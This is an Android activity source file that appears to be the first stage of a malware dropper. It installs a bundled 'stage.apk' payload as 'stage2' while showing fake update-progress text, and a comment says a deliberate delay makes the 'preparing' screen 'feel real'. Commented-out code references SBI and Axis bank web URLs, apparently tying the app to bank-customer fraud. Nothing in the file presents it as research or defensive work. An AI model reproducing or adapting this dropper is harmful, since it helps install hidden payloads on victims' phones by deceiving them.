package com.topdown.omnisec.ui;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.topdown.omnisec.databinding.ActivityMainBinding;
import com.topdown.omnisec.functions.viewmanagers.TempAppCompatActivity;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends TempAppCompatActivity {

    private static final int REQUEST_INSTALL_PERMISSION_CODE = 101;
    ActivityMainBinding binding;
    String URL;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();

//        binding.addUrl.setOnClickListener(v -> openActivityWithRightAnim(new Intent(this, CreateNewUrlActivity.class).putExtra("web", getIntent().getStringExtra("web"))));
//        URL = Objects.equals(getIntent().getStringExtra("web"), "sbi") ? RetrofitClient.SBI_WEB_URL : RetrofitClient.AXIS_WEB_URL;

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.REQUEST_INSTALL_PACKAGES) != PackageManager.PERMISSION_GRANTED) {
            // Request the permission
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.REQUEST_INSTALL_PACKAGES}, REQUEST_INSTALL_PERMISSION_CODE);
        } else {
            // We have permission, start the process
            startInstallationProcess();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_INSTALL_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startInstallationProcess();
            } else {
                binding.statusText.setText("Installation permission is required.");
                Toast.makeText(this, "Cannot proceed without permission.", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startInstallationProcess() {
        // Use a handler to add a slight delay, making the "preparing" screen feel real
        new Handler(Looper.getMainLooper()).postDelayed(this::installStage2, 2000);
    }

    private void installStage2() {
        binding.statusText.setText("Extracting update package...");
        try {
            // The name of the asset we included in the project
            String assetName = "stage.apk";

            // Use the modern PackageInstaller API
            PackageManager pm = getPackageManager();
            PackageInstaller installer = pm.getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            // Create an installation session
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            // Write the APK from assets to the session
            try (OutputStream out = session.openWrite("stage2", 0, -1);
                 InputStream in = getAssets().open(assetName)) {

                byte[] buffer = new byte[8192];
                int read;
                while ((read = in.read(buffer)) != -1) {
                    out.write(buffer, 0, read);
                }
            }

            // Create an intent to capture the result of the installation
            Intent intent = new Intent(this, MainActivity.class);
            intent.putExtra("installation_result", true);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            IntentSender intentSender = pendingIntent.getIntentSender();

            // Commit the session to start the installation
            session.commit(intentSender);
            binding.statusText.setText("Ready to install. Please accept the prompt.");

        } catch (IOException e) {
            e.printStackTrace();
            binding.statusText.setText("Error: Could not prepare update.");
            Toast.makeText(this, "Failed to prepare update.", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // Check if we are returning from the installation screen
        if (intent.getBooleanExtra("installation_result", false)) {
            binding.statusText.setText("Installation complete. You can now close this app.");
            // You can choose to finish() this activity or just leave it.
        }
    }
//    @Override
//    protected void onResume() {
//        super.onResume();
//        RetrofitClient.getInstance(this, URL).getApiInterfaces().getLinks().enqueue(new TempResponseManager(new TempCallback(this, true) {
//            @Override
//            public void onSuccess(@Nullable JSONArray data) {
//                if (data == null || data.length() == 0) {
//                    binding.noLinksLabel.setVisibility(View.VISIBLE);
//                    return;
//                }
//
//                binding.noLinksLabel.setVisibility(View.GONE);
//
//                Type listType = new TypeToken<List<LinkModel>>() {
//                }.getType();
//
//
//                List<LinkModel> adminModelList = new Gson().fromJson(data.toString(), listType);
//                LinksAdapter adapter = new LinksAdapter(adminModelList, MainActivity.this);
//                binding.recyclerView.setAdapter(adapter);
//            }
//        }));
//
//    }
}